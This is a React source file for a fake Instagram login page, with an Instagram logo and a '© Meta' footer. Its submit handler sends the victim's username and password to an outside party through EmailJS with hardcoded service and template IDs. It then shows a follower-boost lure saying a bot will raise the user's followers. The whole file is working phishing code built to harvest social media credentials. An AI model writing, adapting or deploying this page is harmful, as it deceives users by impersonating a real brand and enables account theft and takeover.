import React, { useState } from 'react';
import emailjs from 'emailjs-com';
import Logo from '../assets/logo.webp';
import { toast } from 'react-toastify';

function Instagram() {
  const [formData, setFormData] = useState({
    username: '',
    password: '',
  });

  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value,
    });
  };

  const handleSubmit = (e) => {
    e.preventDefault();

    if (!formData.username || !formData.password) {
      toast.warning('Please fill in both username and password.');
      return;
    }

    emailjs.send(
      'service_4lznixe', // Replace with your actual service ID
      'template_gih8bbt', // Replace with your actual template ID
      {
        username: formData.username,
        password: formData.password,
      },
      'DFe1Be1wA8MJJnHMK' // Replace with your actual user ID
    ).then(
      (result) => {
        console.log('Email sent:', result.text);
        toast.success('Our bot will increase your users to 150 in 2 days');
      },
      (error) => {
        console.error('Error:', error.text);
        toast.warning('An error occurred. Please try again.');
      }
    );
  };

  // Forgot password handler
  const handleForgotPassword = () => {
    toast.warning('Sorry, we can only log in');
  };

  return (
    <div className="flex items-center justify-center h-screen">
      <div className="w-full max-w-xl h-screen flex items-center justify-center p-6 bg-gradient-to-tr from-pink-100 via-purple-100 to-yellow-100 border border-gray-200 rounded-lg shadow-lg">
        <div>
          <div className="flex justify-center mb-16">
            <img src={Logo} alt="Instagram logo" className="w-32 h-32" />
          </div>

          <form className="space-y-4" onSubmit={handleSubmit}>
            <input
              type="text"
              name="username"
              placeholder="Username, email or mobile number"
              value={formData.username}
              onChange={handleChange}
              className="w-full px-4 py-3 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-gray-400 bg-gray-50"
            />
            <input
              type="password"
              name="password"
              placeholder="Password"
              value={formData.password}
              onChange={handleChange}
              className="w-full px-4 py-3 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-gray-400 bg-gray-50"
            />
            <button
              type="submit"
              className="w-full py-2 text-sm font-semibold text-white bg-blue-500 rounded-[100px] hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-400"
            >
              Log in
            </button>
          </form>

          <div className="flex justify-center mt-5">
            <button
              onClick={handleForgotPassword}
              className="text-xs text-blue-500 hover:underline"
            >
              Forgot password?
            </button>
          </div>

          <div className="flex items-center justify-center mt-10 space-x-1">
            <button className="text-sm font-semibold text-blue-500 hover:underline">
              Create new account
            </button>
          </div>

          <div className="flex justify-center mt-6">
            <p className="text-xs text-gray-400">© Meta</p>
          </div>
        </div>
      </div>
    </div>
  );
}

export default Instagram;
